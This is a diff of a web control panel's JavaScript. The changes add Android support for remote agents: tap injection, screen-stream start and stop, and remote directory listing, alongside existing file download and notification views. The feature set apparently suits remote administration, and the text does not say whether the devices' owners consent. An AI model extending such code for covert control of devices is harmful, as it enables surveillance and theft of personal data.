@@ -1381,9 +1381,16 @@ cvs.addEventListener("mousemove",e=>{
 });
 
 cvs.addEventListener("mousedown",e=>{
-  if(!_rcOn||!agent)return;
+  if(!agent)return;
   e.preventDefault();
-  // Ensure cursor is positioned first
+  if(document.body.classList.contains("android-mode")){
+    // Android: send tap via inject_input
+    const{x,y}=_cpos(e);
+    const r=cvs.getBoundingClientRect();
+    socket.emit("inject_input",{type:"tap",x:x*cvs.width,y:y*cvs.height,_target:agent});
+    return;
+  }
+  if(!_rcOn)return;
   const{x,y}=_cpos(e);
   _cmd({action:"mousemove",x,y,sw:1,sh:1});
   _cmd({action:"mousedown",button:e.button,x,y,sw:1,sh:1});
@@ -1440,13 +1447,15 @@ $("fs-btn").addEventListener("click",()=>{const w=$("scr-wrap");document.fullscr
 (function(){
   $("stream-start-btn").addEventListener("click",()=>{
     if(!agent)return;
-    socket.emit("start_screen_stream",{_target:agent});
+    const isAndroid = document.body.classList.contains("android-mode");
+    socket.emit(isAndroid ? "start_screen" : "start_screen_stream",{_target:agent});
     $("stream-start-btn").style.display="none";
     $("stream-stop-btn").style.display="";
   });
   $("stream-stop-btn").addEventListener("click",()=>{
     if(!agent)return;
-    socket.emit("stop_screen_stream",{_target:agent});
+    const isAndroid = document.body.classList.contains("android-mode");
+    socket.emit(isAndroid ? "stop_screen" : "stop_screen_stream",{_target:agent});
     $("stream-stop-btn").style.display="none";
     $("stream-start-btn").style.display="";
     // clear canvas
@@ -2533,7 +2542,7 @@ $("agent-sel").addEventListener("change", () => {
 // ── Helpers ───────────────────────────────────────────────────
 function andFetch(event, payload) {
   if (!agent) { toast("No agent selected", "err"); return; }
-  socket.emit(event, { ...payload, _agent: agent, _requester: socket.id });
+  socket.emit(event, { ...payload, _target: agent, _requester: socket.id });
 }
 function fmt(v, fb) { return (v === undefined || v === null || v === "") ? (fb || "--") : String(v); }
 function ts(ms) {
@@ -2703,7 +2712,7 @@ socket.on("file_data", d => {
   a.click();
   toast("File downloaded", "ok");
 });
-$("and-fm-go").onclick = () => andFetch("list_dir", { path: $("and-fm-path").value });
+$("and-fm-go").onclick = () => { if (agent) socket.emit("list_dir", { path: $("and-fm-path").value, _target: agent }); };
 document.getElementById("and-fm-path").addEventListener("keydown", e => { if (e.key === "Enter") $("and-fm-go").click(); });
 
 // ── Notifications ─────────────────────────────────────────────
